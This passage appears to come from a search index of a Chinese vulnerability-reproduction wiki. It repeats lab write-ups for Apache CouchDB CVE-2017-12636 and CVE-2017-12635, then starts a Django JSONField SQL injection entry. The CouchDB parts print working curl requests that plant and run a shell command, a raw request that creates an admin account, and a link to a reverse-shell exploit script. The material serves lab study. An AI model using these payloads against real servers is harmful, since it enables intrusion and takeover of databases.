\u00b6 \u8be5\u6f0f\u6d1e\u662f\u9700\u8981\u767b\u5f55\u7528\u6237\u65b9\u53ef\u89e6\u53d1\uff0c\u5982\u679c\u4e0d\u77e5\u9053\u76ee\u6807\u7ba1\u7406\u5458\u5bc6\u7801\uff0c\u53ef\u4ee5\u5229\u7528 \u300acouchdb \u5782\u76f4\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\uff08CVE-2017-12635\uff09\u300b https://blog.csdn.net/whatday/article/details/106617994 \u5148\u589e\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u7528\u6237\u3002 1.6.0 \u4e0b\u7684\u8bf4\u660e \u00b6 \u4f9d\u6b21\u6267\u884c\u5982\u4e0b\u8bf7\u6c42\u5373\u53ef\u89e6\u53d1\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff1a curl -X PUT 'http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd' -d '\"id >/tmp/success\"' curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest' curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}' curl -X POST 'http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10' -d '{\"language\":\"cmd\",\"map\":\"\"}' -H 'Content-Type:application/json' \u5176\u4e2d, vulhub:vulhub \u4e3a\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801\u3002 \u7b2c\u4e00\u4e2a\u8bf7\u6c42\u662f\u6dfb\u52a0\u4e00\u4e2a\u540d\u5b57\u4e3a cmd \u7684 query_servers \uff0c\u5176\u503c\u4e3a \"id >/tmp/success\" \uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u540e\u9762\u5f85\u6267\u884c\u7684\u547d\u4ee4\u3002 \u7b2c\u4e8c\u3001\u4e09\u4e2a\u8bf7\u6c42\u662f\u6dfb\u52a0\u4e00\u4e2aDatabase\u548cDocument\uff0c\u8fd9\u91cc\u6dfb\u52a0\u4e86\u540e\u9762\u624d\u80fd\u67e5\u8be2\u3002 \u7b2c\u56db\u4e2a\u8bf7\u6c42\u5c31\u662f\u5728\u8fd9\u4e2aDatabase\u91cc\u8fdb\u884c\u67e5\u8be2\uff0c\u56e0\u4e3a\u6211\u5c06language\u8bbe\u7f6e\u4e3a cmd \uff0c\u8fd9\u91cc\u5c31\u4f1a\u7528\u5230\u6211\u7b2c\u4e00\u6b65\u91cc\u6dfb\u52a0\u7684\u540d\u4e3a cmd \u7684 query_servers \uff0c\u6700\u540e\u89e6\u53d1\u547d\u4ee4\u6267\u884c\u3002 2.1.0 \u4e0b\u7684\u8bf4\u660e \u00b6 2.1.0\u4e2d\u4fee\u6539\u4e86\u6211\u4e0a\u9762\u7528\u5230\u7684\u4e24\u4e2aAPI\uff0c\u8fd9\u91cc\u9700\u8981\u8be6\u7ec6\u8bf4\u660e\u4e00\u4e0b\u3002 Couchdb 2.x \u5f15\u5165\u4e86\u96c6\u7fa4\uff0c\u6240\u4ee5\u4fee\u6539\u914d\u7f6e\u7684API\u9700\u8981\u589e\u52a0node name\u3002\u8fd9\u4e2a\u5176\u5b9e\u4e5f\u7b80\u5355\uff0c\u6211\u4eec\u5e26\u4e0a\u8d26\u53f7\u5bc6\u7801\u8bbf\u95ee /_membership \u5373\u53ef\uff1a curl http://vulhub:vulhub@your-ip:5984/_membership \u53ef\u89c1\uff0c\u6211\u4eec\u8fd9\u91cc\u53ea\u6709\u4e00\u4e2anode\uff0c\u540d\u5b57\u662f nonode@nohost \u3002 \u7136\u540e\uff0c\u6211\u4eec\u4fee\u6539 nonode@nohost \u7684\u914d\u7f6e\uff1a curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '\"id >/tmp/success\"' \u7136\u540e\uff0c\u4e0e1.6.0\u7684\u5229\u7528\u65b9\u5f0f\u76f8\u540c\uff0c\u6211\u4eec\u5148\u589e\u52a0\u4e00\u4e2aDatabase\u548c\u4e00\u4e2aDocument\uff1a curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest' curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}' Couchdb 2.x\u5220\u9664\u4e86 _temp_view \uff0c\u6240\u4ee5\u6211\u4eec\u4e3a\u4e86\u89e6\u53d1 query_servers \u4e2d\u5b9a\u4e49\u7684\u547d\u4ee4\uff0c\u9700\u8981\u6dfb\u52a0\u4e00\u4e2a _view \uff1a curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{\"_id\":\"_design/test\",\"views\":{\"wooyun\":{\"map\":\"\"} },\"language\":\"cmd\"}' -H \"Content-Type: application/json\" \u589e\u52a0 _view \u7684\u540c\u65f6\u5373\u89e6\u53d1\u4e86 query_servers \u4e2d\u7684\u547d\u4ee4\u3002 \u5229\u7528\u811a\u672c \u00b6 \u5199\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u811a\u672c \u4e0b\u8f7d\u5730\u5740 https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py \u4fee\u6539\u5176\u4e2d\u7684target\u548ccommand\u4e3a\u4f60\u7684\u6d4b\u8bd5\u673a\u5668\uff0c\u7136\u540e\u4fee\u6539version\u4e3a\u5bf9\u5e94\u7684Couchdb\u7248\u672c\uff081\u62162\uff09\uff0c\u6210\u529f\u53cd\u5f39shell\uff1a \u9776\u673a\u73af\u5883\uff1a https://vulhub.org/#/environments/couchdb/CVE-2017-12636/","title":"Apache couchdb \u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08cve-2017-12636\uff09"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchdb%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-12636/Apache%20couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2017-12636%EF%BC%89/#apache-couchdb-cve-2017-12636","text":"Apache CouchDB\u662f\u4e00\u4e2a\u5f00\u6e90\u6570\u636e\u5e93\uff0c\u4e13\u6ce8\u4e8e\u6613\u7528\u6027\u548c\u6210\u4e3a\"\u5b8c\u5168\u62e5\u62b1web\u7684\u6570\u636e\u5e93\"\u3002\u5b83\u662f\u4e00\u4e2a\u4f7f\u7528JSON\u4f5c\u4e3a\u5b58\u50a8\u683c\u5f0f\uff0cJavaScript\u4f5c\u4e3a\u67e5\u8be2\u8bed\u8a00\uff0cMapReduce\u548cHTTP\u4f5c\u4e3aAPI\u7684NoSQL\u6570\u636e\u5e93\u3002\u5e94\u7528\u5e7f\u6cdb\uff0c\u5982BBC\u7528\u5728\u5176\u52a8\u6001\u5185\u5bb9\u5c55\u793a\u5e73\u53f0\uff0cCredit Suisse\u7528\u5728\u5176\u5185\u90e8\u7684\u5546\u54c1\u90e8\u95e8\u7684\u5e02\u573a\u6846\u67b6\uff0cMeebo\uff0c\u7528\u5728\u5176\u793e\u4ea4\u5e73\u53f0\uff08web\u548c\u5e94\u7528\u7a0b\u5e8f\uff09\u3002 \u57282017\u5e7411\u670815\u65e5\uff0cCVE-2017-12635\u548cCVE-2017-12636\u62ab\u9732\uff0cCVE-2017-12636\u662f\u4e00\u4e2a\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7config api\u4fee\u6539couchdb\u7684\u914d\u7f6e query_server \uff0c\u8fd9\u4e2a\u914d\u7f6e\u9879\u5728\u8bbe\u8ba1\u3001\u6267\u884cview\u7684\u65f6\u5019\u5c06\u88ab\u8fd0\u884c\u3002 \u5f71\u54cd\u7248\u672c\uff1a\u5c0f\u4e8e 1.7.0 \u4ee5\u53ca \u5c0f\u4e8e 2.1.1 \u53c2\u8003\u94fe\u63a5\uff1a http://bobao.360.cn/learning/detail/4716.html https://justi.cz/security/2017/11/14/couchdb-rce-npm.html","title":"Apache couchdb \u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08cve-2017-12636\uff09"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchdb%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-12636/Apache%20couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2017-12636%EF%BC%89/#_1","text":"Couchdb 2.x\u548c\u548c1.x\u7684API\u63a5\u53e3\u6709\u4e00\u5b9a\u533a\u522b\uff0c\u6240\u4ee5\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u5229\u7528\u65b9\u5f0f\u4e5f\u4e0d\u540c\u3002\u672c\u73af\u5883\u542f\u52a8\u7684\u662f1.6.0\u7248\u672c\uff0c\u5982\u679c\u4f60\u60f3\u6d4b\u8bd52.1.0\u7248\u672c\uff0c\u53ef\u4ee5\u542f\u52a8 CVE-2017-12635 \u9644\u5e26\u7684\u73af\u5883\u3002 \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u542f\u52a8Couchdb 1.6.0\u73af\u5883\uff1a docker-compose up -d \u542f\u52a8\u5b8c\u6210\u540e\uff0c\u8bbf\u95ee http://your-ip:5984/ \u5373\u53ef\u770b\u5230Couchdb\u7684\u6b22\u8fce\u9875\u9762\u3002","title":"\u6d4b\u8bd5\u73af\u5883"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchdb%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-12636/Apache%20couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2017-12636%EF%BC%89/#_2","text":"\u8be5\u6f0f\u6d1e\u662f\u9700\u8981\u767b\u5f55\u7528\u6237\u65b9\u53ef\u89e6\u53d1\uff0c\u5982\u679c\u4e0d\u77e5\u9053\u76ee\u6807\u7ba1\u7406\u5458\u5bc6\u7801\uff0c\u53ef\u4ee5\u5229\u7528 \u300acouchdb \u5782\u76f4\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\uff08CVE-2017-12635\uff09\u300b https://blog.csdn.net/whatday/article/details/106617994 \u5148\u589e\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u7528\u6237\u3002","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchdb%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-12636/Apache%20couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2017-12636%EF%BC%89/#160","text":"\u4f9d\u6b21\u6267\u884c\u5982\u4e0b\u8bf7\u6c42\u5373\u53ef\u89e6\u53d1\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff1a curl -X PUT 'http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd' -d '\"id >/tmp/success\"' curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest' curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}' curl -X POST 'http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10' -d '{\"language\":\"cmd\",\"map\":\"\"}' -H 'Content-Type:application/json' \u5176\u4e2d, vulhub:vulhub \u4e3a\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801\u3002 \u7b2c\u4e00\u4e2a\u8bf7\u6c42\u662f\u6dfb\u52a0\u4e00\u4e2a\u540d\u5b57\u4e3a cmd \u7684 query_servers \uff0c\u5176\u503c\u4e3a \"id >/tmp/success\" \uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u540e\u9762\u5f85\u6267\u884c\u7684\u547d\u4ee4\u3002 \u7b2c\u4e8c\u3001\u4e09\u4e2a\u8bf7\u6c42\u662f\u6dfb\u52a0\u4e00\u4e2aDatabase\u548cDocument\uff0c\u8fd9\u91cc\u6dfb\u52a0\u4e86\u540e\u9762\u624d\u80fd\u67e5\u8be2\u3002 \u7b2c\u56db\u4e2a\u8bf7\u6c42\u5c31\u662f\u5728\u8fd9\u4e2aDatabase\u91cc\u8fdb\u884c\u67e5\u8be2\uff0c\u56e0\u4e3a\u6211\u5c06language\u8bbe\u7f6e\u4e3a cmd \uff0c\u8fd9\u91cc\u5c31\u4f1a\u7528\u5230\u6211\u7b2c\u4e00\u6b65\u91cc\u6dfb\u52a0\u7684\u540d\u4e3a cmd \u7684 query_servers \uff0c\u6700\u540e\u89e6\u53d1\u547d\u4ee4\u6267\u884c\u3002","title":"1.6.0 \u4e0b\u7684\u8bf4\u660e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchdb%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-12636/Apache%20couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2017-12636%EF%BC%89/#210","text":"2.1.0\u4e2d\u4fee\u6539\u4e86\u6211\u4e0a\u9762\u7528\u5230\u7684\u4e24\u4e2aAPI\uff0c\u8fd9\u91cc\u9700\u8981\u8be6\u7ec6\u8bf4\u660e\u4e00\u4e0b\u3002 Couchdb 2.x \u5f15\u5165\u4e86\u96c6\u7fa4\uff0c\u6240\u4ee5\u4fee\u6539\u914d\u7f6e\u7684API\u9700\u8981\u589e\u52a0node name\u3002\u8fd9\u4e2a\u5176\u5b9e\u4e5f\u7b80\u5355\uff0c\u6211\u4eec\u5e26\u4e0a\u8d26\u53f7\u5bc6\u7801\u8bbf\u95ee /_membership \u5373\u53ef\uff1a curl http://vulhub:vulhub@your-ip:5984/_membership \u53ef\u89c1\uff0c\u6211\u4eec\u8fd9\u91cc\u53ea\u6709\u4e00\u4e2anode\uff0c\u540d\u5b57\u662f nonode@nohost \u3002 \u7136\u540e\uff0c\u6211\u4eec\u4fee\u6539 nonode@nohost \u7684\u914d\u7f6e\uff1a curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '\"id >/tmp/success\"' \u7136\u540e\uff0c\u4e0e1.6.0\u7684\u5229\u7528\u65b9\u5f0f\u76f8\u540c\uff0c\u6211\u4eec\u5148\u589e\u52a0\u4e00\u4e2aDatabase\u548c\u4e00\u4e2aDocument\uff1a curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest' curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}' Couchdb 2.x\u5220\u9664\u4e86 _temp_view \uff0c\u6240\u4ee5\u6211\u4eec\u4e3a\u4e86\u89e6\u53d1 query_servers \u4e2d\u5b9a\u4e49\u7684\u547d\u4ee4\uff0c\u9700\u8981\u6dfb\u52a0\u4e00\u4e2a _view \uff1a curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{\"_id\":\"_design/test\",\"views\":{\"wooyun\":{\"map\":\"\"} },\"language\":\"cmd\"}' -H \"Content-Type: application/json\" \u589e\u52a0 _view \u7684\u540c\u65f6\u5373\u89e6\u53d1\u4e86 query_servers \u4e2d\u7684\u547d\u4ee4\u3002","title":"2.1.0 \u4e0b\u7684\u8bf4\u660e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchdb%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-12636/Apache%20couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2017-12636%EF%BC%89/#_3","text":"\u5199\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u811a\u672c \u4e0b\u8f7d\u5730\u5740 https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py \u4fee\u6539\u5176\u4e2d\u7684target\u548ccommand\u4e3a\u4f60\u7684\u6d4b\u8bd5\u673a\u5668\uff0c\u7136\u540e\u4fee\u6539version\u4e3a\u5bf9\u5e94\u7684Couchdb\u7248\u672c\uff081\u62162\uff09\uff0c\u6210\u529f\u53cd\u5f39shell\uff1a \u9776\u673a\u73af\u5883\uff1a https://vulhub.org/#/environments/couchdb/CVE-2017-12636/","title":"\u5229\u7528\u811a\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchedb%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9ECVE-2017-12635/Couchdb%20%E5%9E%82%E7%9B%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12635%EF%BC%89%E6%BC%8F%E6%B4%9E/","text":"Couchdb \u5782\u76f4\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\uff08CVE-2017-12635\uff09\u6f0f\u6d1e \u00b6 couchdb\u7b80\u4ecb\uff1a Apache CouchDB\u662f\u4e00\u4e2a\u5f00\u6e90\u7684NoSQL\u6570\u636e\u5e93\uff0c\u4e13\u6ce8\u4e8e\u6613\u7528\u6027\u548c\u6210\u4e3a\u201c\u5b8c\u5168\u62e5\u62b1web\u7684\u6570\u636e\u5e93\u201d\u3002\u5b83\u662f\u4e00\u4e2a\u4f7f\u7528JSON\u4f5c\u4e3a\u6570\u636e\u5b58\u50a8\u683c\u5f0f\uff0cjavascript\u4f5c\u4e3a\u67e5\u8be2\u8bed\u8a00\uff0cMapReduce\u548cHTTP\u4f5c\u4e3aAPI\u7684NoSQL\u6570\u636e\u5e93\u3002 \u6f0f\u6d1e\u539f\u7406\uff1a CVE-2017-12635\uff1aErlang\u548cJavaScript\uff0c\u5bf9JSON\u89e3\u6790\u65b9\u5f0f\u7684\u4e0d\u540c\uff0c\u5bfc\u81f4\u8bed\u53e5\u6267\u884c\u4ea7\u751f\u5dee\u5f02\u6027\u3002\u8fd9\u4e2a\u6f0f\u6d1e\u53ef\u4ee5\u8ba9**\u4efb\u610f\u7528\u6237\u521b\u5efa\u7ba1\u7406\u5458**\uff0c\u5c5e\u4e8e\u5782\u76f4\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\u3002 \u4e3e\u4f8b\uff1a Erlang: > jiffy:decode(``\"{\"``a``\":\"``1``\", \"``a``\":\"``2``\"}\"``). {[{<<``\"a\"``>>,<<``\"1\"``>>},{<<``\"a\"``>>,<<``\"2\"``>>}]} JavaScript: > JSON.parse(\"{\"a\":\"1\", \"a\": \"2\"}\") {a: \"2\"} \u5728\u5b9a\u4e49\u4e00\u5bf9\u952e\u503c\u5bf9\u65f6\uff0cEralang\u89e3\u6790\u5668\u5c06\u5b58\u50a8\u4e24\u4e2a\u503c\uff1bjavascript\u53ea\u5b58\u50a8\u7b2c\u4e8c\u4e2a\u503c\u3002\u4f46jiffy\u5b9e\u73b0\u65f6\uff0cgetter\u51fd\u6570\u53ea\u8fd4\u56de\u7b2c\u4e00\u4e2a\u503c\u3002\u8fd9\u91cc\u6d89\u53ca\u7684\u51fd\u6570\u53c2\u8003\uff1a https://www.anquanke.com/post/id/87256 \uff1b https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635 \u5f71\u54cd\u7248\u672c\uff1a \u5c0f\u4e8e 1.7.0 \u4ee5\u53ca \u5c0f\u4e8e 2.1.1 \u590d\u73b0\uff1a \u6784\u9020\u521b\u5efa\u7528\u6237\u7684\u6570\u636e\u5305 \u7ed5\u8fc7role\u9a8c\u8bc1\uff1a payload\uff1a PUT /_users/org.couchdb.user:vulhub HTTP/1.1``Host: 192.168.183.134:5984``Accept: */*``Accept-Language: en``User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)``Connection: close``Content-Type: application/json``Content-Length: 110 {`` ``\"type\"``: ``\"user\"``,`` ``\"name\"``: ``\"vulhub\"``,`` ``\"roles\"``: [``\"_admin\"``],`` ``\"roles\"``:[],`` ``\"password\"``: ``\"vulhub111\"``} \u4e00\u4e9b\u5c0f\u601d\u8003\uff1a \u867d\u7136\u5206\u6790\u8bf4\uff0c\u53ea\u8bfb\u53d6\u7b2c\u4e00\u4e2a\u952e\u503c\uff0c\u6309\u7406\u6765\u8bf4\uff0c\u7b2c\u4e8c\u4e2a\u503c\u662f\u4efb\u610f\u7684\u5e94\u8be5\u4e0d\u5f71\u54cd\uff0c\u4f46\u6211\u6d4b\u8bd5\u53d1\u73b0\uff0c\u53ea\u6709\u4e3a\u7a7a\u65f6\uff0cpoc\u624d\u6b63\u786e\u64cd\u4f5c\u3002 \u4e14\u5728\u521b\u5efa\u4e00\u4e2a\u6210\u529f\u540e\uff0c\u518d\u91cd\u590d\u53d1\u5305\uff0c\u4e5f\u4f1a\u62a5\u9519409\uff0c \u4fee\u6539\u5df2\u521b\u5efa\u7684\u5bc6\u7801\u4e5f\u4e0d\u884c","title":"Couchdb \u5782\u76f4\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\uff08CVE-2017-12635\uff09\u6f0f\u6d1e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Couchedb%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9ECVE-2017-12635/Couchdb%20%E5%9E%82%E7%9B%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12635%EF%BC%89%E6%BC%8F%E6%B4%9E/#couchdb-cve-2017-12635","text":"couchdb\u7b80\u4ecb\uff1a Apache CouchDB\u662f\u4e00\u4e2a\u5f00\u6e90\u7684NoSQL\u6570\u636e\u5e93\uff0c\u4e13\u6ce8\u4e8e\u6613\u7528\u6027\u548c\u6210\u4e3a\u201c\u5b8c\u5168\u62e5\u62b1web\u7684\u6570\u636e\u5e93\u201d\u3002\u5b83\u662f\u4e00\u4e2a\u4f7f\u7528JSON\u4f5c\u4e3a\u6570\u636e\u5b58\u50a8\u683c\u5f0f\uff0cjavascript\u4f5c\u4e3a\u67e5\u8be2\u8bed\u8a00\uff0cMapReduce\u548cHTTP\u4f5c\u4e3aAPI\u7684NoSQL\u6570\u636e\u5e93\u3002 \u6f0f\u6d1e\u539f\u7406\uff1a CVE-2017-12635\uff1aErlang\u548cJavaScript\uff0c\u5bf9JSON\u89e3\u6790\u65b9\u5f0f\u7684\u4e0d\u540c\uff0c\u5bfc\u81f4\u8bed\u53e5\u6267\u884c\u4ea7\u751f\u5dee\u5f02\u6027\u3002\u8fd9\u4e2a\u6f0f\u6d1e\u53ef\u4ee5\u8ba9**\u4efb\u610f\u7528\u6237\u521b\u5efa\u7ba1\u7406\u5458**\uff0c\u5c5e\u4e8e\u5782\u76f4\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\u3002 \u4e3e\u4f8b\uff1a Erlang: > jiffy:decode(``\"{\"``a``\":\"``1``\", \"``a``\":\"``2``\"}\"``). {[{<<``\"a\"``>>,<<``\"1\"``>>},{<<``\"a\"``>>,<<``\"2\"``>>}]} JavaScript: > JSON.parse(\"{\"a\":\"1\", \"a\": \"2\"}\") {a: \"2\"} \u5728\u5b9a\u4e49\u4e00\u5bf9\u952e\u503c\u5bf9\u65f6\uff0cEralang\u89e3\u6790\u5668\u5c06\u5b58\u50a8\u4e24\u4e2a\u503c\uff1bjavascript\u53ea\u5b58\u50a8\u7b2c\u4e8c\u4e2a\u503c\u3002\u4f46jiffy\u5b9e\u73b0\u65f6\uff0cgetter\u51fd\u6570\u53ea\u8fd4\u56de\u7b2c\u4e00\u4e2a\u503c\u3002\u8fd9\u91cc\u6d89\u53ca\u7684\u51fd\u6570\u53c2\u8003\uff1a https://www.anquanke.com/post/id/87256 \uff1b https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635 \u5f71\u54cd\u7248\u672c\uff1a \u5c0f\u4e8e 1.7.0 \u4ee5\u53ca \u5c0f\u4e8e 2.1.1 \u590d\u73b0\uff1a \u6784\u9020\u521b\u5efa\u7528\u6237\u7684\u6570\u636e\u5305 \u7ed5\u8fc7role\u9a8c\u8bc1\uff1a payload\uff1a PUT /_users/org.couchdb.user:vulhub HTTP/1.1``Host: 192.168.183.134:5984``Accept: */*``Accept-Language: en``User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)``Connection: close``Content-Type: application/json``Content-Length: 110 {`` ``\"type\"``: ``\"user\"``,`` ``\"name\"``: ``\"vulhub\"``,`` ``\"roles\"``: [``\"_admin\"``],`` ``\"roles\"``:[],`` ``\"password\"``: ``\"vulhub111\"``} \u4e00\u4e9b\u5c0f\u601d\u8003\uff1a \u867d\u7136\u5206\u6790\u8bf4\uff0c\u53ea\u8bfb\u53d6\u7b2c\u4e00\u4e2a\u952e\u503c\uff0c\u6309\u7406\u6765\u8bf4\uff0c\u7b2c\u4e8c\u4e2a\u503c\u662f\u4efb\u610f\u7684\u5e94\u8be5\u4e0d\u5f71\u54cd\uff0c\u4f46\u6211\u6d4b\u8bd5\u53d1\u73b0\uff0c\u53ea\u6709\u4e3a\u7a7a\u65f6\uff0cpoc\u624d\u6b63\u786e\u64cd\u4f5c\u3002 \u4e14\u5728\u521b\u5efa\u4e00\u4e2a\u6210\u529f\u540e\uff0c\u518d\u91cd\u590d\u53d1\u5305\uff0c\u4e5f\u4f1a\u62a5\u9519409\uff0c \u4fee\u6539\u5df2\u521b\u5efa\u7684\u5bc6\u7801\u4e5f\u4e0d\u884c","title":"Couchdb \u5782\u76f4\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\uff08CVE-2017-12635\uff09\u6f0f\u6d1e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/DJANGO/CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","text":"CVE-2019-14234 Django JSONField SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6807\u7b7e\uff1a \u6f0f\u6d1e\u590d\u73b0 \u5b89\u5168 0x01\u7b80\u4ecb \u00b6 Django\u662f\u4e00\u6b3e\u5e7f\u4e3a\u6d41\u884c\u7684\u5f00\u6e90web\u6846\u67b6\uff0c\u7531Python\u7f16\u5199\uff0c\u8bb8\u591a\u7f51\u7ad9\u548capp\u90fd\u57fa\u4e8eDjango\u5f00\u53d1\u3002 \u4ec0\u4e48\u662fJSONField\uff0cDjango\u662f\u4e00\u4e2a\u5927\u800c\u5168\u7684Web\u6846\u67b6\uff0c\u5176\u652f\u6301\u5f88\u591a\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5305\u62ecPostgresql\u3001Mysql\u3001Oracle\u3001Sqlite3\u7b49\uff0c\u4f46\u4e0eDjango\u5929\u751f\u4e3a\u4e00\u5bf9\u513f\u7684\u6570\u636e\u5e93\u83ab\u8fc7\u4e8ePostgresql\u4e86\uff0cDjango\u5b98\u65b9\u4e5f\u5efa\u8bae\u914d\u5408Postgresql\u4e00\u8d77\u4f7f\u7528\u3002 \u76f8\u6bd4\u4e8eMysql\uff0cPostgresql\u652f\u6301\u7684\u6570\u636e\u7c7b\u578b\u66f4\u52a0\u4e30\u5bcc\uff0c\u5176\u5bf9JSON\u683c\u5f0f\u6570\u636e\u7684\u652f\u6301\u4e5f\u8ba9\u8fd9\u4e2a\u5173\u7cfb\u578b\u6570\u636e\u5e93\u62e5\u6709\u4e86NoSQL\u7684\u4e00\u4e9b\u7279\u70b9\u3002 0x02\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u8be5\u6f0f\u6d1e\u9700\u8981\u5f00\u53d1\u8005\u4f7f\u7528\u4e86JSONField/HStoreField\uff0c\u4e14\u7528\u6237\u53ef\u63a7queryset\u67e5\u8be2\u65f6\u7684\u952e\u540d\uff0c\u5728\u952e\u540d\u7684\u4f4d\u7f6e\u6ce8\u5165SQL\u8bed\u53e5\u3002 